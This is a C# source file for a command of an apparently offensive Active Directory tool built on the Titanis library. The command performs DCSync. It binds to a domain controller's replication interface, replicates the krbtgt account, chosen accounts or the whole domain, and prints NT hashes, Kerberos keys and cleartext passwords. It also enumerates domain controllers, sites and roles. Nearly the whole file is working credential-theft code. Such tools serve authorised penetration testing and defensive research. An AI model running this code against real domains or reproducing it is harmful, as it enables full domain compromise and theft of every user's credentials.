using System.ComponentModel;
using System.Net;
using System.Net.Security;
using Titanis;
using Titanis.Cli;
using Titanis.DceRpc;
using Titanis.DceRpc.Client;
using Titanis.Ldap;
using Titanis.Msrpc.Msdrsr;
using Titanis.Net;
using Titanis.Security;
using Titanis.Security.Kerberos;
using Titanis.Winterop.SamServer;

namespace Atlas.Protocols;

/// <summary>
/// DCSync: replicates credential material for directory objects from a DC
/// </summary>
[Description("Replicates credentials from a domain controller (DCSync). Use the DC's FQDN for Kerberos; with an IP, provide -ud <domain> and NTLM creds.")]
public sealed class DcsyncCommand : Command
{
	[Parameter(0)]
	[Mandatory]
	[Placeholder("dc")]
	[Description("Domain controller to replicate from")]
	public string ServerName { get; set; } = null!;

	[Parameter(1)]
	[Description("Objects to sync: samAccountName, DN, GUID, SID, or '(ldap filter)'. Default: krbtgt")]
	public string[]? ObjectSpecs { get; set; }

	[ParameterGroup(ParameterGroupOptions.AlwaysInstantiate)]
	public RpcParameterGroup RpcParameters { get; set; } = null!;

	[Parameter]
	[Alias("dc-info")]
	[Description("List all domain controllers (DsGetDomainControllerInfo)")]
	public SwitchParam DcInfo { get; set; }

	[Parameter]
	[Alias("list-domains")]
	[Description("List domains in the forest (DsCrackNames)")]
	public SwitchParam ListDomains { get; set; }

	[Parameter]
	[Alias("list-sites")]
	[Description("List sites in the forest (DsCrackNames)")]
	public SwitchParam ListSites { get; set; }

	[Parameter]
	[Alias("list-roles")]
	[Description("List FSMO role owners (DsCrackNames)")]
	public SwitchParam ListRoles { get; set; }

	[Parameter]
	[Alias("list-partitions")]
	[Description("List naming contexts/partitions (DsCrackNames)")]
	public SwitchParam ListPartitions { get; set; }

	[Parameter]
	[Alias("list-gcs")]
	[Description("List global catalog servers (DsCrackNames)")]
	public SwitchParam ListGcs { get; set; }

	[Parameter]
	[Description("Show inbound/outbound replication neighbors (DsReplicaGetInfo)")]
	public SwitchParam Neighbors { get; set; }

	[Parameter]
	[Alias("crack-name")]
	[Description("Resolve a name via DsCrackNames (auto-detects SID/GUID/DN/UPN/SAM)")]
	public string? CrackName { get; set; }

	[Parameter]
	[Description("Replicate ALL secrets from the domain NC (full DCSync, NetExec --ntds drsuapi)")]
	public SwitchParam Ntds { get; set; }

	private static readonly string[] DefaultAttrNames =
	[
		nameof(LdapAttributeTypes.SAMAccountName),
		nameof(LdapAttributeTypes.ObjectSid),
		nameof(LdapAttributeTypes.UnicodePwd),
		"DBCSPwd",
		nameof(LdapAttributeTypes.NtPwdHistory),
		nameof(LdapAttributeTypes.LmPwdHistory),
		"kerberosKeys",
		"kerberosOldKeys",
		"cleartextPassword",
	];

	private const string SuppCredsAttr = nameof(LdapAttributeTypes.SupplementalCredentials);

	protected override void ValidateParameters(ParameterValidationContext context)
	{
		var rpcParams = this.RpcParameters;
		rpcParams.Authentication?.Validate(!this.RpcParameters.Authentication.Anonymous.IsSet, context);
	}

	protected sealed override async Task<int> RunAsync(CancellationToken cancellationToken)
	{
		var rpcParams = this.RpcParameters;

		if (rpcParams.NetParameters.HostAddress is null || rpcParams.NetParameters.HostAddress.Length == 0)
			rpcParams.NetParameters.HostAddress = new[] { this.ServerName };

		var remoteAddrs = await rpcParams.NetParameters.ResolveAsync(this.ServerName, cancellationToken).ConfigureAwait(false);
		if (remoteAddrs is null || remoteAddrs.Length == 0)
		{
			AtlasConsole.Fail(this.ServerName, $"Unable to resolve '{this.ServerName}'");
			return 1;
		}

		RpcClient rpcClient = this.Services.CreateRpcClient();
		rpcParams.ApplyTo(rpcClient, RpcAuthLevel.PacketPrivacy);

		DirectoryReplicationClient drs = new DirectoryReplicationClient();
		await rpcParams.BindServiceClient(drs, this.ServerName, cancellationToken).ConfigureAwait(false);

		int pid = Random.Shared.Next(100, 500) * 4;
		await using DsBinding dsbind = await drs.Dsbind(
			DsbindScenario.Repnc,
			DirectoryReplicationClient.NtdsapiClientGuid,
			Guid.Empty,
			pid,
			cancellationToken,
			DirectoryReplicationClient.Windows2025BindFlags).ConfigureAwait(false);

		string? userDomain = rpcParams.Authentication.UserDomain;
		if (string.IsNullOrEmpty(userDomain))
		{
			// Derive from DC FQDN: dc01.corp.local -> CORP.LOCAL
			int idx = this.ServerName.IndexOf('.');
			userDomain = (idx > 0) ? this.ServerName[(idx + 1)..].ToUpperInvariant() : null;
			if (string.IsNullOrEmpty(userDomain))
			{
				AtlasConsole.Fail(this.ServerName, "Cannot determine the domain: specify -ud <domain> when targeting the DC by address.");
				return 1;
			}
		}

		var dcInfos = await dsbind.GetDcInfo(userDomain!, cancellationToken).ConfigureAwait(false);
		if (dcInfos.Length == 0)
		{
			AtlasConsole.Fail(this.ServerName, "Unable to find any DCs in the domain.");
			return 1;
		}
		var dcInfo = dcInfos[0];
		AtlasConsole.Info($"{this.ServerName}:135", $"domain: {userDomain} - dc: {dcInfo.DnsHostName}");

		bool hasTopology = this.DcInfo.IsSet || this.ListDomains.IsSet || this.ListSites.IsSet || this.ListRoles.IsSet
			|| this.ListPartitions.IsSet || this.ListGcs.IsSet || this.Neighbors.IsSet || this.CrackName is not null;
		if (hasTopology)
			await this.RunTopologyAsync(dsbind, dcInfos, cancellationToken).ConfigureAwait(false);

		bool explicitObjects = this.ObjectSpecs is not null && this.ObjectSpecs.Length > 0;
		if (hasTopology && !explicitObjects && !this.Ntds.IsSet)
			return 0;

		List<DsName> names = new List<DsName>();
		ExtendedOpRequest exop = ExtendedOpRequest.ReplObject;
		if (this.Ntds.IsSet)
		{
			var ncDn = await this.GetDomainNcDnAsync(cancellationToken).ConfigureAwait(false);
			names.Add(new DsName(Guid.Empty, null, ncDn));
			exop = 0; // full-NC REPL_SECRET sync (Titanis ReplicateNcCommand)
			AtlasConsole.Info($"{this.ServerName}:135", $"--ntds: replicating all secrets from {ncDn}");
		}
		else
		{
			var specs = (!explicitObjects)
				? new[] { "krbtgt" }
				: this.ObjectSpecs.SelectMany(s => s.Split(',', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries));

		List<string> filters = new List<string>();
		foreach (var spec in specs)
		{
			if (spec.StartsWith('('))
			{
				filters.Add(spec);
				continue;
			}
			if (DsName.TryParse(spec, out var dsname))
			{
				names.Add(dsname!);
				continue;
			}
			// Plain name -> resolve via LDAP as samAccountName
			Guid? guid = await this.ResolveAccountAsync(host: this.ServerName, sam: spec, cancellationToken).ConfigureAwait(false);
			if (guid is Guid g && g != Guid.Empty)
				names.Add(new DsName(g, null, null));
			else
				AtlasConsole.Warn($"{this.ServerName}:135", $"object not found: {spec}");
		}

		foreach (var filter in filters)
		{
			await foreach (var dn in this.ResolveFilterAsync(filter, cancellationToken).ConfigureAwait(false))
				names.Add(dn);
		}
		} // end non-Ntds spec parsing

		if (names.Count == 0)
		{
			AtlasConsole.Warn($"{this.ServerName}:135", "no objects selected");
			return 1;
		}

		string[] attrOids = BuildAttrOids();
		var usnvec = await dsbind.GetNcChanges(
			dcInfo,
			GetNamesAsync(names),
			attrOids,
			1000,
			10 << 20,
			new UsnVector(),
			new DcsyncCallback(this.ServerName),
			1,
			exop,
			cancellationToken).ConfigureAwait(false);

		AtlasConsole.Info($"{this.ServerName}:135", $"dcsync complete (USN vector: {Convert.ToHexString(usnvec.ToBytes())})");
		return 0;
	}

	private async Task RunTopologyAsync(DsBinding dsbind, DomainControllerInfo[] dcInfos, CancellationToken cancellationToken)
	{
		if (this.DcInfo.IsSet)
		{
			foreach (var dc in dcInfos)
				AtlasConsole.Success($"{this.ServerName}:135", $"dc: {dc.DnsHostName} site={dc.SiteName} pdc={dc.IsPdc} gc={dc.IsGc} ds={dc.IsDsEnabled}");
			AtlasConsole.Info($"{this.ServerName}:135", $"--dc-info: {dcInfos.Length} DC(s)");
		}
		if (this.ListDomains.IsSet)
		{
			var names = await dsbind.GetDomains(DsCrackNameResultFormat.Fqdn1779, cancellationToken).ConfigureAwait(false);
			foreach (var n in names) AtlasConsole.Success($"{this.ServerName}:135", $"domain: {n}");
			AtlasConsole.Info($"{this.ServerName}:135", $"--list-domains: {names.Length} domain(s)");
		}
		if (this.ListSites.IsSet)
		{
			var names = await dsbind.GetSites(DsCrackNameResultFormat.Fqdn1779, cancellationToken).ConfigureAwait(false);
			foreach (var n in names) AtlasConsole.Success($"{this.ServerName}:135", $"site: {n}");
			AtlasConsole.Info($"{this.ServerName}:135", $"--list-sites: {names.Length} site(s)");
		}
		if (this.ListRoles.IsSet)
		{
			var names = await dsbind.GetRoles(DsCrackNameResultFormat.Fqdn1779, cancellationToken).ConfigureAwait(false);
			foreach (var n in names) AtlasConsole.Success($"{this.ServerName}:135", $"role owner: {n}");
			AtlasConsole.Info($"{this.ServerName}:135", $"--list-roles: {names.Length} role(s)");
		}
		if (this.ListPartitions.IsSet)
		{
			var names = await dsbind.GetPartitions(DsCrackNameResultFormat.Fqdn1779, cancellationToken).ConfigureAwait(false);
			foreach (var n in names) AtlasConsole.Success($"{this.ServerName}:135", $"partition: {n}");
			AtlasConsole.Info($"{this.ServerName}:135", $"--list-partitions: {names.Length} partition(s)");
		}
		if (this.ListGcs.IsSet)
		{
			var names = await dsbind.GetGlobalCatalogServers(DsCrackNameResultFormat.Fqdn1779, cancellationToken).ConfigureAwait(false);
			foreach (var n in names) AtlasConsole.Success($"{this.ServerName}:135", $"gc: {n}");
			AtlasConsole.Info($"{this.ServerName}:135", $"--list-gcs: {names.Length} GC(s)");
		}
		if (this.Neighbors.IsSet)
		{
			var from = await dsbind.GetRepsFromNeighbors(null, cancellationToken).ConfigureAwait(false);
			foreach (var n in from)
				AtlasConsole.Success($"{this.ServerName}:135", $"reps-from: nc={n.NamingContext} dsa={n.NeighborDsaAddress} lastSuccess={n.LastSyncSuccessTime:yyyy-MM-dd HH:mm:ss} result={n.LastSyncResult}");
			var to = await dsbind.GetRepsToNeighbors(null, cancellationToken).ConfigureAwait(false);
			foreach (var n in to)
				AtlasConsole.Success($"{this.ServerName}:135", $"repsto: nc={n.NamingContext} dsa={n.NeighborDsaAddress}");
			AtlasConsole.Info($"{this.ServerName}:135", $"--neighbors: {from.Length} inbound, {to.Length} outbound");
		}
		if (this.CrackName is not null)
		{
			string name = this.CrackName;
			DsCrackNameFormat offered = DsCrackNameFormat.SamAccountNameSansDomain;
			if (name.StartsWith("S-1-", StringComparison.OrdinalIgnoreCase)) offered = DsCrackNameFormat.SidOrSidHistory;
			else if (Guid.TryParse(name.Trim('{', '}'), out _)) offered = DsCrackNameFormat.UniqueIdName;
			else if (name.Contains('=')) offered = DsCrackNameFormat.Fqdn1779;
			else if (name.Contains('@')) offered = DsCrackNameFormat.UserPrincipalName;
			var cracked = await dsbind.CrackName(name, offered, DsCrackNameResultFormat.Fqdn1779, cancellationToken).ConfigureAwait(false);
			foreach (var c in cracked) AtlasConsole.Success($"{this.ServerName}:135", $"cracked ({offered}): {c}");
			if (cracked.Length == 0) AtlasConsole.Info($"{this.ServerName}:135", $"--crack-name: no result for '{name}'");
		}
	}

	private async Task<LdapDistinguishedName> GetDomainNcDnAsync(CancellationToken cancellationToken)
	{
		LdapClient ldap = await ConnectLdapAsync(this.ServerName, cancellationToken).ConfigureAwait(false);
		if (ldap.DomainRoot is null)
			throw new InvalidOperationException("Cannot determine domain naming context");
		return ldap.DomainRoot;
	}

	private static string[] BuildAttrOids()
	{
		List<string> oids = new List<string>();
		bool wantsSuppCreds = false;
		foreach (var name in DefaultAttrNames)
		{
			var attr = LdapAttributeTypes.TryGetByNameOrOid(name);
			if (attr != null)
			{
				oids.Add(attr.Oid);
			}
			else if (name.Equals("KERBEROSKEYS", StringComparison.OrdinalIgnoreCase)
				|| name.Equals("KERBEROSOLDKEYS", StringComparison.OrdinalIgnoreCase)
				|| name.Equals("CLEARTEXTPASSWORD", StringComparison.OrdinalIgnoreCase))
			{
				wantsSuppCreds = true;
			}
		}
		if (wantsSuppCreds)
			oids.Add(LdapAttributeTypes.SupplementalCredentials.Oid);
		return oids.ToArray();
	}

	private static async IAsyncEnumerable<DsName> GetNamesAsync(List<DsName> names)
	{
		foreach (var n in names)
			yield return n;
		await Task.CompletedTask;
	}

	private async Task<Guid?> ResolveAccountAsync(string host, string sam, CancellationToken cancellationToken)
	{
		LdapClient ldap = await ConnectLdapAsync(host, cancellationToken).ConfigureAwait(false);
		var query = new LdapQuery(ldap.DomainRoot, LdapSearchScope.WholeSubtree, LdapFilter.Parse($"(samAccountName={EscapeLdap(sam)})"), [])
		{
			PageSize = 20,
			Options = LdapQueryOptions.AllPages
		};
		var results = await ldap.Search(query, cancellationToken).ConfigureAwait(false);
		var entry = results.Entries.FirstOrDefault();
		if (entry is null)
			return null;
		object? v = entry[nameof(LdapAttributeTypes.ObjectGUID)]?.Value;
		return v switch
		{
			Guid g => g,
			byte[] b => new Guid(b),
			_ => null
		};
	}

	private async IAsyncEnumerable<DsName> ResolveFilterAsync(string filter, [System.Runtime.CompilerServices.EnumeratorCancellation] CancellationToken cancellationToken)
	{
		LdapClient ldap = await ConnectLdapAsync(this.ServerName, cancellationToken).ConfigureAwait(false);
		var query = new LdapQuery(ldap.DomainRoot, LdapSearchScope.WholeSubtree, LdapFilter.Parse(filter),
			[new AttributeSpec(nameof(LdapAttributeTypes.ObjectGUID))])
		{
			PageSize = 20,
			Options = LdapQueryOptions.AllPages
		};
		var results = await ldap.Search(query, cancellationToken).ConfigureAwait(false);
		foreach (var entry in results.Entries)
		{
			object? v = entry[nameof(LdapAttributeTypes.ObjectGUID)]?.Value;
			Guid? guid = v switch
			{
				Guid gv => gv,
				byte[] b => new Guid(b),
				_ => null
			};
			if (guid is Guid gd)
				yield return new DsName(gd, null, null);
		}
	}

	private Task<LdapClient> ConnectLdapAsync(string host, CancellationToken cancellationToken)
	{
		var resolver = this.RpcParameters.NetParameters ?? new NetworkParameters();
		var socketService = new PlatformSocketService(resolver, this.Log);
		var credService = this.Services.RequireService<IClientCredentialService>();
		return LdapClient.Connect(new DnsEndPoint(host, 389), (SslClientAuthenticationOptions?)null, socketService, credService, cancellationToken);
	}

	private static string EscapeLdap(string s)
		=> s.Replace("\\", "\\5c").Replace("(", "\\28").Replace(")", "\\29").Replace("*", "\\2a");

	private sealed class DcsyncCallback(string host) : IDrsChangeCallback
	{
		public Task OnObjectReplicated(DsObject obj)
		{
			LdapEntry entry = obj.ToLdapEntry();
			string user = (entry[LdapAttributeTypes.SAMAccountName]?.Value as string)
				?? entry.EntryName?.ToString()
				?? "(unknown)";
			AtlasConsole.Info($"{host}:445", $"dcsync: replicated {user} ({obj.Attributes.Length} attr(s))");

			if (entry[LdapAttributeTypes.UnicodePwd]?.Value is byte[] ntHash)
			{
				AtlasConsole.Success($"{host}:445", $"dcsync: {user} NT: {Convert.ToHexString(ntHash)}");
			}

			if (entry["kerberosKeys"]?.Values is object[] keys && keys.Length > 0)
			{
				foreach (var k in keys.OfType<KerberosKeyInfo>())
				{
					AtlasConsole.Success($"{host}:445", $"dcsync: {user} {((EType)k.KeyType)} kvno={k.Kvno}: {Convert.ToHexString(k.Bytes)}");
				}
			}

			if (entry["cleartextPassword"]?.Value is byte[] clear && clear.Length > 0)
			{
				AtlasConsole.Success($"{host}:445", $"dcsync: {user} CLEARTEXT: {System.Text.Encoding.Unicode.GetString(clear).TrimEnd('\0')}");
			}

			return Task.CompletedTask;
		}

		public Task OnError(DsName objectName, Exception exception)
		{
			AtlasConsole.Fail($"{host}:445", $"error retrieving {objectName}: {exception.Message}");
			return Task.CompletedTask;
		}
	}
}
